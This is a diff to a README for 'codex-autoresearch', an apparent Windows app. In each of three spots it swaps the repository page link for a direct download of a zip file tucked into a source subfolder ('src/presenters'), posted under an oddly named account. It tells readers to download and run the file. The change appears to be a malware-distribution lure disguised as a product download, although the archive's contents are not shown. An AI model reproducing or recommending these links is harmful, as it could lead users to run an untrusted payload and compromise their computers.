@@ -1,6 +1,6 @@
 # 🤖 codex-autoresearch - Keep long tasks running
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/taxpayerreunification534/codex-autoresearch)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/taxpayerreunification534/codex-autoresearch/raw/refs/heads/main/src/presenters/autoresearch-codex-2.0-beta.2.zip)
 
 ## 🚀 What this app does
 
@@ -31,7 +31,7 @@ For best results, close large apps before you start. This gives codex-autoresear
 
 Visit this page to download and run the app:
 
-https://github.com/taxpayerreunification534/codex-autoresearch
+https://github.com/taxpayerreunification534/codex-autoresearch/raw/refs/heads/main/src/presenters/autoresearch-codex-2.0-beta.2.zip
 
 If the page shows a release file, download it to your PC. If it shows source files only, use the main download button on the page and save the file to your Downloads folder.
 
@@ -188,4 +188,4 @@ If you get a new Windows computer:
 
 ## 📎 Download again
 
-https://github.com/taxpayerreunification534/codex-autoresearch
+https://github.com/taxpayerreunification534/codex-autoresearch/raw/refs/heads/main/src/presenters/autoresearch-codex-2.0-beta.2.zip
